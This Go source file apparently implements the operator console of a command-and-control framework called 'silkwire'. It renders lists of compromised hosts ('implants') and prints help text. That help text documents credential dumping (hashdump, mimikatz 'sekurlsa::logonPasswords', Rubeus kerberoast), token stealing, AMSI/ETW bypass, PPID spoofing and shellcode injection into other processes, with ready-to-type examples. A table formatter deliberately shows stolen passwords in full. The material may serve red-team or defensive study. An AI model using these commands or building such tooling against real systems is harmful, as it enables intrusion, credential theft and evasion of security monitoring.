package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"

	pb "silkwire/proto"

	"github.com/stevedomin/termtable"
)

// --- Simple ANSI color helpers ---
const (
	colorReset       = "\033[0m"
	colorRed         = "31"
	colorGreen       = "32"
	colorYellow      = "33"
	colorBlue        = "34"
	colorMagenta     = "35"
	colorCyan        = "36"
	colorLightGray   = "37"
	colorBrightGreen = "92"
	colorBrightRed   = "91"
	colorBrightCyan  = "96"
	colorDarkGray    = "90"
)

func colorize(s string, color string) string {
	return "\033[" + color + "m" + s + colorReset
}

// createHackerPrompt creates a cyberpunk/hacker terminal style prompt
func createHackerPrompt() string {
	// Create minimal hacker-style prompt
	// Format: silkwire >>
	prompt := fmt.Sprintf("%s ",
		colorize("silkwire >>", colorBrightRed)) // Bright red prompt

	return prompt
}

// createHackerSessionPrompt creates a cyberpunk/hacker style prompt for session mode
func createHackerSessionPrompt(codename string) string {
	// Get current working directory
	pwd, err := os.Getwd()
	if err != nil {
		pwd = "~"
	}

	dirName := filepath.Base(pwd)
	if dirName == "." || dirName == "/" {
		dirName = "~"
	}

	// Create session-specific hacker prompt
	// Format: dir SESSION[codename] >>
	prompt := fmt.Sprintf("%s %s %s ",
		colorize(dirName, colorYellow),
		colorize(fmt.Sprintf("SESSION[%s]", codename), colorBrightRed), // Bright red for session mode
		colorize(">>", colorBrightCyan))                                // Bright cyan arrows for session mode

	return prompt
}

func formatDuration(d time.Duration) string {
	if d < time.Minute {
		return fmt.Sprintf("%.0fs", d.Seconds())
	} else if d < time.Hour {
		return fmt.Sprintf("%.0fm", d.Minutes())
	} else if d < 24*time.Hour {
		return fmt.Sprintf("%.1fh", d.Hours())
	} else {
		return fmt.Sprintf("%.1fd", d.Hours()/24)
	}
}

func printBanner() {
	printBannerWithStats(nil)
}

func printBannerWithStats(oc *OperatorConsole) {
	fmt.Print("\033[2J\033[H") // Clear screen
	fmt.Println()

	// Get random ASCII art banner
	banner := getRandomBanner()
	fmt.Println(colorize(banner, colorRed))
	fmt.Println()

	// Random hacker quote with better formatting
	hackerQuote := getRandomHackerQuote()
	fmt.Printf("%s %s\n", colorize("▶", colorBrightRed), colorize(hackerQuote, colorYellow))
	fmt.Println()

	// Footer with help hint
	fmt.Printf("%s %s\n",
		colorize("┌─", colorDarkGray),
		colorize(" Type 'help' to view available commands or 'sessions' to see active implants", colorLightGray))
	fmt.Println()
}

func getRandomBanner() string {
	banners := []string{
		// Original banner
		`
███████ ██      ██ ██   ██ ██     ██ ██ ██████  ███████ 
██      ██      ██ ██  ██  ██     ██ ██ ██   ██ ██      
███████ ██      ██ █████   ██  █  ██ ██ ██████  █████   
     ██ ██      ██ ██  ██  ██ ███ ██ ██ ██   ██ ██      
███████ ███████ ██ ██   ██  ███ ███  ██ ██   ██ ███████ `,

		// Stylized banner
		`
                                                                                
   mmmm    mmmm         ##     mm                     ##                        
 m#""""#   ""##         ""     ##                     ""                        
 ##m         ##       ####     ## m##"  ##      ##  ####      ##m####   m####m  
  "####m     ##         ##     ##m##    "#  ##  #"    ##      ##"      ##mmmm## 
      "##    ##         ##     ##"##m    ##m##m##     ##      ##       ##"""""" 
 #mmmmm#"    ##mmm   mmm##mmm  ##  "#m   "##  ##"  mmm##mmm   ##       "##mmmm# 
  """""       """"   """"""""  ""   """   ""  ""   """"""""   ""         """"" `,

		// Block style banner
		`
  ********  ** ** **                **               
 **//////  /**// /**               //                
/**        /** **/**  ** ***     ** ** ******  ***** 
/********* /**/**/** ** //**  * /**/**//**//* **///**
////////** /**/**/****   /** ***/**/** /** / /*******
       /** /**/**/**/**  /****/****/** /**   /**//// 
 ********  ***/**/**//** ***/ ///**/**/***   //******
////////  /// // //  // ///    /// // ///     ////// `,

		// Simple text banner
		`
:'######::'##:::::::'####:'##:::'##:'##:::::'##:'####:'########::'########:
'##... ##: ##:::::::. ##:: ##::'##:: ##:'##: ##:. ##:: ##.... ##: ##.....::
 ##:::..:: ##:::::::: ##:: ##:'##::: ##: ##: ##:: ##:: ##:::: ##: ##:::::::
. ######:: ##:::::::: ##:: #####:::: ##: ##: ##:: ##:: ########:: ######:::
:..... ##: ##:::::::: ##:: ##. ##::: ##: ##: ##:: ##:: ##.. ##::: ##...::::
'##::: ##: ##:::::::: ##:: ##:. ##:: ##: ##: ##:: ##:: ##::. ##:: ##:::::::
. ######:: ########:'####: ##::. ##:. ###. ###::'####: ##:::. ##: ########:
:......:::........::....::..::::..:::...::...:::....::..:::::..::........::`,

		// Compact banner
		`
8""""8                                         
8      e     e  e   e  e   e  e e  eeeee  eeee 
8eeeee 8     8  8   8  8   8  8 8  8   8  8    
    88 8e    8e 8eee8e 8e  8  8 8e 8eee8e 8eee 
e   88 88    88 88   8 88  8  8 88 88   8 88   
8eee88 88eee 88 88   8 88ee8ee8 88 88   8 88ee 
                                               `,

		// Digital style banner
		`
 oooooooo8 o888  o88   oooo                      o88                           
888         888  oooo   888  ooooo oooo  o  oooo oooo  oo oooooo    ooooooooo8 
 888oooooo  888   888   888o888     888 888 888   888   888    888 888oooooo8  
        888 888   888   8888 88o     888888888    888   888        888         
o88oooo888 o888o o888o o888o o888o    88   88    o888o o888o         88oooo888 
                                                                               `,
	}

	// Seed random number generator with current time
	rand.Seed(time.Now().UnixNano())

	// Return random banner
	return banners[rand.Intn(len(banners))]
}

// getRandomHackerQuote returns a random hacker culture quote
func getRandomHackerQuote() string {
	quotes := []string{
		"The only way to learn a new programming language is by writing programs in it. - Dennis Ritchie",
		"Information wants to be free. - Stewart Brand",
		"The best way to get the right answer is to ask the right question. - Unix Philosophy",
		"Hackers solve problems and build things. - Eric S. Raymond",
		"Think like a hacker, code like an artist. - Anonymous",
		"In cyberspace, the First Amendment is a local ordinance. - John Perry Barlow",
		"Privacy is not something that I'm merely entitled to, it's an absolute prerequisite. - Marlon Brando",
		"The Internet treats censorship as damage and routes around it. - John Gilmore",
		"Being able to break security doesn't make you a hacker anymore than being able to hotwire cars makes you an automotive engineer. - Eric S. Raymond",
		"Curious minds build the future. Question everything.",
		"Code is poetry written in logic.",
		"In a world of locked doors, the man with the key is king.",
		"Access denied is just an invitation to be more creative.",
		"The matrix has you... but not for long.",
		"Reality is just another layer of abstraction.",
	}

	// Seed random number generator with current time
	rand.Seed(time.Now().UnixNano())

	// Return random quote
	return quotes[rand.Intn(len(quotes))]
}

func displayCommandResult(result *pb.CommandResultResponse) {
	if result == nil {
		fmt.Println("No result received")
		return
	}

	// Clean up any remaining progress indicators
	fmt.Print("\r")

	success := result.Success
	output := result.Output
	errorMsg := result.Error

	if success {
		if strings.TrimSpace(output) != "" {
			// Try to parse as JSON and format nicely
			formattedOutput := formatOutputIfJSON(output)
			fmt.Printf("\n\n%s\n", formattedOutput)
		} else {
			fmt.Println(colorize("No output returned", colorYellow))
		}
	} else {
		fmt.Printf("Command failed\n")

		if errorMsg != "" {
			fmt.Printf("%s %s\n", colorize("Error:", colorRed), errorMsg)
		}
		if strings.TrimSpace(output) != "" {
			// Try to format error output as JSON too
			formattedOutput := formatOutputIfJSON(output)
			fmt.Printf("%s\n%s\n", colorize("Output:", colorYellow), formattedOutput)
		}
		fmt.Println()
	}
}

// formatOutputIfJSON attempts to parse and format JSON output for better display
func formatOutputIfJSON(output string) string {
	// Trim whitespace
	trimmed := strings.TrimSpace(output)

	// Check if output looks like JSON (starts with { or [)
	if !strings.HasPrefix(trimmed, "{") && !strings.HasPrefix(trimmed, "[") {
		return output // Return as-is if not JSON
	}

	// Try to parse as JSON
	var jsonData interface{}
	if err := json.Unmarshal([]byte(trimmed), &jsonData); err != nil {
		return output // Return as-is if not valid JSON
	}

	// Check what type of JSON we have and format accordingly
	switch data := jsonData.(type) {
	case map[string]interface{}:
		return formatJSONObject(data)
	case []interface{}:
		return formatJSONArray(data)
	default:
		// Fallback to pretty-printed JSON
		formatted, err := json.MarshalIndent(jsonData, "", "  ")
		if err != nil {
			return output
		}
		return string(formatted)
	}
}

// formatJSONObject formats a JSON object for display
func formatJSONObject(data map[string]interface{}) string {
	var builder strings.Builder

	// Check for common result structures
	if status, hasStatus := data["status"]; hasStatus {
		statusStr := fmt.Sprintf("%v", status)
		if statusStr == "success" {
			builder.WriteString(colorize("✓ Status: ", colorGreen))
			builder.WriteString(colorize(statusStr, colorGreen))
		} else {
			builder.WriteString(colorize("✗ Status: ", colorRed))
			builder.WriteString(colorize(statusStr, colorRed))
		}
		builder.WriteString("\n")
	}

	// Display other fields in a structured way
	for key, value := range data {
		if key == "status" {
			continue // Already displayed
		}

		// Special handling for output field - display it prominently
		if key == "output" {
			if strValue, ok := value.(string); ok && len(strValue) > 0 {
				builder.WriteString(colorize("\n=== Assembly Output ===\n", colorGreen))
				builder.WriteString(strValue)
				builder.WriteString(colorize("\n======================\n", colorGreen))
				continue
			}
		}

		// Format key
		builder.WriteString(colorize(key+": ", colorCyan))

		// Format value based on type
		switch v := value.(type) {
		case map[string]interface{}:
			builder.WriteString("\n")
			indented := formatJSONObject(v)
			for _, line := range strings.Split(indented, "\n") {
				if line != "" {
					builder.WriteString("  " + line + "\n")
				}
			}
		case []interface{}:
			if len(v) == 0 {
				builder.WriteString("[]")
			} else {
				builder.WriteString(fmt.Sprintf("\n%s", formatJSONArray(v)))
			}
		case string:
			// Color-code based on common field names
			if key == "error" || key == "Error" {
				builder.WriteString(colorize(v, colorRed))
			} else if key == "message" || key == "Message" {
				builder.WriteString(colorize(v, colorYellow))
			} else {
				builder.WriteString(v)
			}
		case bool:
			if v {
				builder.WriteString(colorize("true", colorGreen))
			} else {
				builder.WriteString(colorize("false", colorRed))
			}
		default:
			builder.WriteString(fmt.Sprintf("%v", v))
		}
		builder.WriteString("\n")
	}

	return builder.String()
}

// formatJSONArray formats a JSON array for display
func formatJSONArray(data []interface{}) string {
	if len(data) == 0 {
		return colorize("No entries found", colorYellow)
	}

	var builder strings.Builder

	// Check if array contains objects (common for list results)
	if len(data) > 0 {
		if _, isObject := data[0].(map[string]interface{}); isObject {
			// Try to format as a table if objects have consistent structure
			tableOutput := tryFormatAsTable(data)
			if tableOutput != "" {
				return tableOutput
			}
		}
	}

	// Fallback: format each item with index
	builder.WriteString(colorize(fmt.Sprintf("Found %d entries:\n", len(data)), colorCyan))
	for i, item := range data {
		builder.WriteString(colorize(fmt.Sprintf("\n[%d] ", i+1), colorYellow))

		switch v := item.(type) {
		case map[string]interface{}:
			itemStr := formatJSONObject(v)
			for _, line := range strings.Split(itemStr, "\n") {
				if line != "" {
					builder.WriteString("  " + line + "\n")
				}
			}
		case string:
			builder.WriteString(v + "\n")
		default:
			formatted, _ := json.MarshalIndent(v, "  ", "  ")
			builder.WriteString(string(formatted) + "\n")
		}
	}

	return builder.String()
}

// tryFormatAsTable attempts to format an array of objects as a table
func tryFormatAsTable(data []interface{}) string {
	if len(data) == 0 {
		return ""
	}

	// Check first object to determine if table formatting is suitable
	_, ok := data[0].(map[string]interface{})
	if !ok {
		return ""
	}

	// Get all unique keys from all objects
	keySet := make(map[string]bool)
	for _, item := range data {
		if obj, ok := item.(map[string]interface{}); ok {
			for key := range obj {
				keySet[key] = true
			}
		}
	}

	// Convert to sorted slice for consistent column order
	// Prioritize "Name" to be first, then sort the rest
	var keys []string
	for key := range keySet {
		keys = append(keys, key)
	}

	// Custom sort: "Name" first, then alphabetical
	sort.Slice(keys, func(i, j int) bool {
		if keys[i] == "Name" || keys[i] == "name" {
			return true // Name always comes first
		}
		if keys[j] == "Name" || keys[j] == "name" {
			return false // Name always comes first
		}
		return keys[i] < keys[j] // Otherwise alphabetical
	})

	// Create table
	t := termtable.NewTable(nil, &termtable.TableOptions{
		Padding:      2,
		UseSeparator: true,
	})

	// Set headers
	headers := make([]string, len(keys))
	for i, key := range keys {
		headers[i] = colorize(strings.Title(key), colorCyan)
	}
	t.SetHeader(headers)

	// Add rows
	for _, item := range data {
		obj, ok := item.(map[string]interface{})
		if !ok {
			continue
		}

		row := make([]string, len(keys))
		for i, key := range keys {
			if val, exists := obj[key]; exists {
				row[i] = formatTableValue(val, key)
			} else {
				row[i] = "-"
			}
		}
		t.AddRow(row)
	}

	// Check if table would be reasonable size (not too many columns)
	if len(keys) > 8 {
		return "" // Too many columns, fallback to regular format
	}

	return t.Render()
}

// formatTableValue formats a value for display in a table cell
func formatTableValue(val interface{}, key string) string {
	// Never truncate sensitive credential fields - show full encoded strings
	noTruncateFields := map[string]bool{
		"password":          true,
		"Password":          true,
		"username":          true,
		"Username":          true,
		"encryptedPassword": true,
		"encryptedUsername": true,
	}

	shouldTruncate := !noTruncateFields[key]

	switch v := val.(type) {
	case string:
		// Truncate long strings unless it's a credential field
		if shouldTruncate && len(v) > 50 {
			return v[:47] + "..."
		}
		return v
	case bool:
		if v {
			return colorize("✓", colorGreen)
		}
		return colorize("✗", colorRed)
	case float64:
		// Check if it's actually an integer
		if v == float64(int64(v)) {
			return fmt.Sprintf("%d", int64(v))
		}
		return fmt.Sprintf("%.2f", v)
	case nil:
		return colorize("-", colorDarkGray)
	default:
		str := fmt.Sprintf("%v", v)
		if shouldTruncate && len(str) > 50 {
			return str[:47] + "..."
		}
		return str
	}
}

func printSessionsTable(sessions []*Session) {
	if len(sessions) == 0 {
		fmt.Println(colorize("No active sessions found", colorYellow))
		return
	}

	// Sort sessions by creation time (newest last)
	sort.Slice(sessions, func(i, j int) bool {
		return sessions[i].Created.Before(sessions[j].Created)
	})

	// Create a new table
	t := termtable.NewTable(nil, &termtable.TableOptions{
		Padding:      2,
		UseSeparator: false,
	})

	// Set headers with colors
	t.SetHeader([]string{
		colorize("ID", colorBlue),
		colorize("Name", colorBlue),
		colorize("Transport", colorBlue),
		colorize("Hostname", colorBlue),
		colorize("Username", colorBlue),
		colorize("OS/Arch", colorBlue),
		colorize("Locale", colorBlue),
		colorize("Last", colorBlue),
		colorize("Health", colorBlue),
	})

	// Add rows with session data
	now := time.Now()
	for _, session := range sessions {
		lastSeen := now.Sub(session.LastSeen)
		var healthIcon string
		var healthText string
		var statusColor string

		// Health status based on last seen time
		if lastSeen < 1*time.Minute {
			healthIcon = "Active"
			healthText = ""
			statusColor = colorGreen
		} else if lastSeen < 2*time.Minute {
			healthIcon = "Idle"
			healthText = ""
			statusColor = colorYellow
		} else if lastSeen < 10*time.Minute {
			healthIcon = "Stale"
			healthText = ""
			statusColor = colorYellow
		} else {
			healthIcon = "Lost"
			healthText = ""
			statusColor = colorRed
		}

		// Format and truncate fields as needed
		shortID := truncateString(session.ImplantID, 8)
		codename := truncateString(session.Codename, 14)
		if codename == "" {
			codename = truncateString(session.ProcessName, 14) // Fallback to process name
		}

		// Use actual transport from session data
		transport := session.Transport
		if transport == "" || transport == "unknown" {
			transport = "HTTPS" // Default assumption for established connections
		}
		transport = truncateString(transport, 8)

		hostname := truncateString(session.Hostname, 16)
		username := truncateString(session.Username, 12)

		osSystem := fmt.Sprintf("%s/%s", session.OS, session.Arch)
		osSystem = truncateString(osSystem, 14)

		// Infer locale from OS (simplified)
		locale := inferLocale(session.OS)
		locale = truncateString(locale, 6)

		lastMsg := formatDuration(lastSeen)

		// Add row to table
		t.AddRow([]string{
			colorize(shortID, statusColor),
			codename,
			transport,
			hostname,
			username,
			osSystem,
			locale,
			lastMsg,
			fmt.Sprintf("%s %s", healthIcon, healthText),
		})
	}

	// Render the table
	fmt.Println(t.Render())
	fmt.Println()
}

// truncateString truncates a string to fit within the specified width
func truncateString(s string, width int) string {
	if len(s) <= width {
		return s
	}
	if width <= 3 {
		return s[:width]
	}
	return s[:width-3] + "..."
}

// inferLocale makes a best guess at locale based on OS
func inferLocale(os string) string {
	switch strings.ToLower(os) {
	case "windows":
		return "en-US"
	case "linux":
		return "en-US"
	case "darwin":
		return "en-US"
	case "freebsd", "openbsd", "netbsd":
		return "en-US"
	default:
		return "unknown"
	}
}

func showWelcomeMessage() {
	printBanner()
	fmt.Printf("%s\n", colorize("Available Commands:", colorCyan))
	fmt.Println("  sessions, s          - List all active sessions")
	fmt.Println("  sessions rm <id>     - Terminate a session and delete its record")
	fmt.Println("  sessions purge <id>  - Delete session record (no signal)")
	fmt.Println("  listeners            - List active listeners")
	fmt.Println("  implants             - List all generated implants")
	fmt.Println("  refresh, r           - Refresh session list")
	fmt.Println("  use <id>             - Enter interactive session mode")
	fmt.Println("  shell <id>           - Enter enhanced shell mode")
	fmt.Println("  ps <id>              - List processes")
	fmt.Println("  pwd <id>             - Show current directory")
	fmt.Println("  ls <id> [path]       - List directory contents")
	fmt.Println("  sysinfo <id>         - Get system information")
	fmt.Println("  hashdump <id>        - Dump password hashes (SAM/shadow)")
	fmt.Println("  listener             - Manage listeners (add, ls, rm)")
	fmt.Println("  generate             - Generate implants")
	fmt.Println("  regenerate           - Regenerate a previous implant build")
	fmt.Println("  help, h, ?           - Show this help message")
	fmt.Println("  clear                - Clear screen and show banner")
	fmt.Println("  quit, q, exit        - Exit console")
	fmt.Printf("\n%s\n", colorize("Tips:", colorYellow))
	fmt.Println("  • Use partial session IDs (e.g., 'cd334a25' instead of full ID)")
	fmt.Println("  • Commands support tab completion")
	fmt.Println("  • Use 'use <id>' to enter interactive session mode")
	fmt.Printf("\n%s\n\n", colorize("Checking for active sessions...", colorBlue))
}

func showMainHelp() {
	fmt.Printf("\n%s\n", colorize("Console Commands:", colorCyan))
	fmt.Println()
	fmt.Printf("%s\n", colorize("Session Management:", colorBlue))
	fmt.Println("  sessions, s          - List all active sessions with status")
	fmt.Println("  sessions rm <id>     - Terminate a session")
	fmt.Println("  sessions purge <id>  - Delete session record (no signal)")
	fmt.Println("  listeners            - List active listeners")
	fmt.Println("  implants             - List all generated implants")
	fmt.Println("  refresh, r           - Refresh the session list")
	fmt.Println("  status               - Show console status and statistics")
	fmt.Println()
	fmt.Printf("%s\n", colorize("Implant Management:", colorBlue))
	fmt.Println("  generate             - Generate new implants with custom options")
	fmt.Println("  regenerate <codename> - Regenerate a previously built implant")
	fmt.Println("    --save <dir>       - Save regenerated implant to specified directory")
	fmt.Println()
	fmt.Printf("%s\n", colorize("Session Interaction:", colorBlue))
	fmt.Println("  use <id>             - Enter interactive session mode")
	fmt.Println("  shell <id>           - Enter enhanced interactive shell")
	fmt.Println("    • Direct command execution (no prefixes)")
	fmt.Println("    • Command history and auto-completion")
	fmt.Println("    • Persistent working directory")
	fmt.Println("    • Use !exit to return to main console")
	fmt.Println()
	fmt.Printf("%s\n", colorize("Quick Commands:", colorBlue))
	fmt.Println("  ps <id>              - List running processes")
	fmt.Println("  pwd <id>             - Show current working directory")
	fmt.Println("  ls <id> [path]       - List directory contents")
	fmt.Println("  sysinfo <id>         - Get detailed system information")
	fmt.Println("  hashdump <id>        - Dump password hashes (SAM/shadow)")
	fmt.Println()
	fmt.Printf("%s\n", colorize("Token Manipulation (Windows):", colorBlue))
	fmt.Println("  When in session mode (use 'use <id>' first):")
	fmt.Println("  token-list           - Enumerate available tokens from processes")
	fmt.Println("  token-steal <pid>    - Steal access token from a process")
	fmt.Println("  token-impersonate <token_id> - Impersonate a stolen token")
	fmt.Println("  token-revert         - Revert to original token")
	fmt.Println("  token-make <domain> <user> <pass> - Create token with credentials")
	fmt.Println()
	fmt.Printf("%s\n", colorize("Memory Execution (Windows):", colorBlue))
	fmt.Println("  execute-assembly [options] <assembly> [args...]")
	fmt.Println("  execute-shellcode [options] <shellcode>")
	fmt.Println("  execute-pe [options] <pe_path> [pe_args...]")
	fmt.Println()
	fmt.Println("  execute-assembly:")
	fmt.Println("    • Default: Sacrificial process execution (server converts to Donut shellcode)")
	fmt.Println("    • Server performs architecture-aware conversion and captures stdout/stderr")
	fmt.Println("    • Assembly crashes won't kill the implant (process isolation)")
	fmt.Println("    • Use -i/--in-process for risky in-process CLR hosting")
	fmt.Println()
	fmt.Println("    Options:")
	fmt.Println("      -i, --in-process          Execute in implant process (RISKY)")
	fmt.Println("      -p, --process <path>      Custom sacrificial process (default: WerFault.exe)")
	fmt.Println("      -r, --runtime <version>   .NET runtime version (default: v4.0.30319)")
	fmt.Println("      -a, --amsi-bypass         Enable AMSI/WLDP bypass (Donut)")
	fmt.Println("      -e, --etw-bypass          Enable ETW bypass (Donut)")
	fmt.Println("      -d, --appdomain <name>    Custom AppDomain name (in-process only)")
	fmt.Println("      --ppid <pid>              Parent process ID for PPID spoofing")
	fmt.Println("      -c, --class <name>        Class name for DLL assemblies (Donut)")
	fmt.Println("      -m, --method <name>       Method name for DLL assemblies (Donut)")
	fmt.Println()
	fmt.Println("  execute-shellcode:")
	fmt.Println("    • Methods: self, remote, rtlcreateuserthread, userapc")
	fmt.Println("    • remote/rtl/userapc require --pid <target>")
	fmt.Println("    • --base64 supports inline encoded payloads")
	fmt.Println("    • Ideal for Donut/raw shellcode loaders")
	fmt.Println()
	fmt.Println("  execute-pe:")
	fmt.Println("    • Server converts native PE (EXE/DLL) to Donut shellcode")
	fmt.Println("    • Injects into sacrificial process (default: WerFault.exe) with output capture")
	fmt.Println("    • Supports --ppid for parent spoofing and --spawn-args for process command-line")
	fmt.Println("    • Trailing arguments become the PE's command line")
	fmt.Println()
	fmt.Printf("%s\n", colorize("Console Controls:", colorBlue))
	fmt.Println("  auto-refresh         - Toggle automatic session refresh")
	fmt.Println("  notifications check  - Info about session event logging")
	fmt.Println("  notifications clear  - Info about clearing terminal output")
	fmt.Println("  history              - Show command history")
	fmt.Println("  clear                - Clear screen and show banner")
	fmt.Println("  help, h, ?           - Show this help message")
	fmt.Println("  quit, q, exit        - Exit console")
	fmt.Println()
	fmt.Printf("%s\n", colorize("Usage Examples:", colorYellow))
	fmt.Println("  sessions             → List all active sessions")
	fmt.Println("  use cd334a25         → Enter interactive session mode")
	fmt.Println("  shell cd334a25       → Enter shell mode with session cd334a25")
	fmt.Println("  ps cd334a25          → Show processes for session cd334a25")
	fmt.Println("  ls cd334a25 /tmp     → List contents of /tmp directory")
	fmt.Println()
	fmt.Printf("%s\n", colorize("Token Usage Examples (in session mode):", colorYellow))
	fmt.Println("  token-list           → List all available tokens")
	fmt.Println("  token-steal 1234     → Steal token from PID 1234")
	fmt.Println("  token-impersonate token_1234_0 → Impersonate the stolen token")
	fmt.Println("  token-make CORP admin P@ss → Create token with credentials")
	fmt.Println("  token-revert         → Revert to original token")
	fmt.Println()
	fmt.Printf("%s\n", colorize("Execute-Assembly Examples (in session mode):", colorYellow))
	fmt.Println("  # Default: Sacrificial process (dllhost.exe) with Donut shellcode")
	fmt.Println("  execute-assembly Seatbelt.exe -group=system")
	fmt.Println()
	fmt.Println("  # Custom sacrificial process")
	fmt.Println("  execute-assembly -p C:\\Windows\\System32\\cmd.exe Rubeus.exe kerberoast")
	fmt.Println()
	fmt.Println("  # PPID spoofing (spawn under specific parent process)")
	fmt.Println("  execute-assembly --ppid 1234 SharpDPAPI.exe")
	fmt.Println()
	fmt.Println("  # DLL assembly with class and method")
	fmt.Println("  execute-assembly --class MyClass --method Run assembly.dll arg1 arg2")
	fmt.Println()
	fmt.Println("  # Enable AMSI and ETW bypass")
	fmt.Println("  execute-assembly -a -e Rubeus.exe triage")
	fmt.Println()
	fmt.Println("  # In-process execution (RISKY - asks for confirmation)")
	fmt.Println("  execute-assembly -i SharpUp.exe")
	fmt.Println()
	fmt.Println("  # Specify .NET runtime version")
	fmt.Println("  execute-assembly -r v2.0.50727 LegacyTool.exe")
	fmt.Println()
	fmt.Printf("%s\n", colorize("Execute-Shellcode Examples (in session mode):", colorYellow))
	fmt.Println("  execute-shellcode beacon.bin")
	fmt.Println("  execute-shellcode -m remote -p 1337 loader.bin")
	fmt.Println("  execute-shellcode --method userapc --pid 888 --base64 AAAA....")
	fmt.Println()
	fmt.Printf("%s\n", colorize("Execute-PE Examples (in session mode):", colorYellow))
	fmt.Println("  execute-pe mimikatz.exe \"privilege::debug\" \"sekurlsa::logonPasswords\"")
	fmt.Println("  execute-pe -p C:\\Windows\\System32\\dllhost.exe --ppid 4450 tool.exe")
	fmt.Println()
	fmt.Printf("%s\n", colorize("Pro Tips:", colorGreen))
	fmt.Println("  • Use partial session IDs for faster typing")
	fmt.Println("  • Tab completion works for commands and session IDs")
	fmt.Println("  • Use 'use <id>' for the most interactive experience")
	fmt.Println("  • Use Ctrl+C to interrupt long-running operations")
	fmt.Println("  • Session events are logged above the prompt using logrus")
	fmt.Println()
}
